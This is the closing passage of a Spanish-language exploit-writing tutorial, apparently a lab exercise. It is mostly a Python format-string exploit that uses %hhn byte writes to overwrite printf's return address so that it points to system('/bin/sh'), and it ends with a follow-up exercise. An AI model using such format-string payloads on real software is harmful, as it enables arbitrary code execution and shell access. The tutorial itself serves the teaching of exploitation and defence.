arg_sys_addr_byte_0  = arg_sys_addr             #low
arg_sys_addr_byte_1  = arg_sys_addr + 1
arg_sys_addr_byte_2  = arg_sys_addr + 2
arg_sys_addr_byte_3  = arg_sys_addr + 3         #high   
    
#ret_addr de printf()
exploit  = "A"
exploit += pack("&lt;I", ret_addr_byte_0)          #%hhn
exploit += "BBBB"                               #%x
exploit += pack("&lt;I", ret_addr_byte_1)          #%hhn
exploit += "CCCC"                               #%x
exploit += pack("&lt;I", ret_addr_byte_2)          #%hhn                               
exploit += "DDDD"                               #%x                                 
exploit += pack("&lt;I", ret_addr_byte_3)          #%hhn
exploit += "EEEE"                               #%x
    
#argumento de system()                  
exploit += "FFFF"
exploit += pack("&lt;I", arg_sys_addr_byte_0)      #%hhn
exploit += "GGGG"                               #%x                                 
exploit += pack("&lt;I", arg_sys_addr_byte_1)      #%hhn                               
exploit += "HHHH"                               #%x                                 
exploit += pack("&lt;I", arg_sys_addr_byte_2)      #%hhn                               
exploit += "IIII"                               #%x                                 
exploit += pack("&lt;I", arg_sys_addr_byte_3)      #%hhn                               
exploit += "JJJJ"                                                                   
    
#padding
exploit += "%08x." * 114                
    
#calculo system() addr                                                              
#low_byte
exploit += "%189x"                      #cant. bytes procesados: 0xe0               
exploit += "%hhn"                       #escribe ret_addr_byte_0                    
#2do_byte
exploit += "%83x"                       #cant. bytes: 0x33                          
exploit += "%hhn"                       #ret_addr_byte_1                            
#3er_byte
exploit += "%179x"                      #cant. bytes: 0xe6                          
exploit += "%hhn"                       #ret_addr_byte_2                            
#high_byte 
exploit += "%209x"                      #cant. bytes: 0xb7                          
exploit += "%hhn"                       #ret_addr_byte_3                            
                                                                                        
#calculo /bin/sh addr 
#low_byte
exploit += "%154x"                      #cant. bytes procesados: 0x51               
exploit += "%hhn"                       #escribe arg_sys_addr_byte_0                
#2do_byte
exploit += "%244x"                      #cant. bytes: 0x45                          
exploit += "%hhn"                       #arg_sys_addr_byte_1                        
#3er_byte
exploit += "%179x"                      #cant. bytes: 0xf8                          
exploit += "%hhn"                       #arg_sys_addr_byte_2                        
#high_byte 
exploit += "%191x"                      #cant. bytes: 0xb7                          
exploit += "%hhn"                       #arg_sys_addr_byte_3                        
    
sys.stdout.write(pad(exploit))
</code></pre>

    <p>Y al ejecutarlo logramos llamar a <code>system("/bin/sh")</code> y obtenemos una shell.</p>

    <p><img src="/guia-escritura-exploits/esoteric/imagenes/e1/11-gdb.png" alt="gdb" /></p>
  </li>
</ol>

<h3 id="cómo-seguir">¿Cómo seguir?</h3>

<ol>
  <li><strong>Usar variables de entorno</strong>: plantear un ataque alternativo a <strong>E1</strong> almacenando <code>/bin/sh</code> en una variable de entorno.</li>
</ol>


</div>

    </div>

  </body>
</html>
